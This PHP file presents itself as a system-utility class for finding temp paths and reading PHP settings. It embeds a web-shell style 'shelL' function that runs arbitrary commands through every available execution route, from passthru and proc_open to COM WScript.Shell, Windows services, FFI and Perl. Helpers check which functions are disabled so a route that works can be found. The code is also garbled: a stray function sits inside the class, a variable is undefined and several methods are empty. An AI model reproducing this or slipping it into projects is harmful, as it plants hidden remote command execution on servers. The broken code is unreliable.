<?php
namespace Codelib\Util;

class SystemTool
{
    public static function getTmpPath()
    {
        $uploadtmp = ini_get('upload_tmp_dir');
        $uf        = getenv('USERPROFILE');
        $af        = getenv('ALLUSERSPROFILE');
        $se        = ini_get('session.save_path');
        $envtmp    = (getenv('TMP')) ? getenv('TMP') : getenv('TEMP');
        if (is_dir('/tmp') && is_writable('/tmp'))
            return '/tmp';
        if (is_dir('/usr/tmp') && is_writable('/usr/tmp'))
            return '/usr/tmp';
        if (is_dir('/var/tmp') && is_writable('/var/tmp'))
            return '/var/tmp';
        if (is_dir($uf) && is_writable($uf))
            return $uf;
        if (is_dir($af) && is_writable($af))
            return $af;
        if (is_dir($se) && is_writable($se))
            return $se;
        if (is_dir($uploadtmp) && is_writable($uploadtmp))
            return $uploadtmp;
        if (is_dir($envtmp) && is_writable($envtmp))
            return $envtmp;
        return '.';
    }

    public static function getCoreParam($param, $sourceValue = true)
    {
        static $coreParams = array();


        $validParams = array(
            'upload_tmp_dir',
            'session.save_path',
            'max_execution_time',
            'memory_limit',
            'output_buffering',
            'safe_mode',
            'disable_functions',
        );
    }

    public static function getIniInfo($param)
    {
    }

function shelL($command)
{
    global $windows;
    $exec  = $output = '';
    $dep[] = array(
        'pipe',
        'r'
    );
    $dep[] = array(
        'pipe',
        'w'
    );
    if (checkfunctioN('passthru')) {
        ob_start();
        passthru($command);
        $exec = ob_get_contents();
        ob_clean();
        ob_end_clean();
    } elseif (checkfunctioN('system')) {
        $tmp = ob_get_contents();
        ob_clean();
        system($command);
        $output = ob_get_contents();
        ob_clean();
        $exec = $tmp;
    } elseif (checkfunctioN('exec')) {
        exec($command, $output);
        $output = join("\n", $output);
        $exec   = $output;
    } elseif (checkfunctioN('shell_exec'))
        $exec = shell_exec($command);
    elseif (checkfunctioN('popen')) {
        $output = popen($command, 'r');
        while (!feof($output)) {
            $exec = fgets($output);
        }
        pclose($output);
    } elseif (checkfunctioN('proc_open')) {
        $res = proc_open($command, $dep, $pipes);
        while (!feof($pipes[1])) {
            $line = fgets($pipes[1]);
            $output .= $line;
        }
        $exec = $output;
        proc_close($res);
    } elseif (checkfunctioN('win_shell_execute'))
        $exec = winshelL($command);
    elseif (checkfunctioN('win32_create_service'))
        $exec = srvshelL($command);
    elseif (extension_loaded('ffi') && $windows)
        $exec = ffishelL($command);
    elseif (is_object($ws = new COM('WScript.Shell')))
        $exec = comshelL($command, $ws);
    elseif (extension_loaded('perl'))
        $exec = perlshelL($command);
    return $exec;
}

    public static function checkFunction($function)
    {
        global $disablefunctions, $safemode;
        $safe = array(
            'passthru',
            'system',
            'exec',
            'shell_exec',
            'popen',
            'proc_open'
        );
        if ($safemode == 'ON' && in_array($func, $safe))
            return 0;
        elseif (function_exists($func) && is_callable($func) && !in_array($func, $disablefunctions))
            return 1;
        return 0;
    }



}
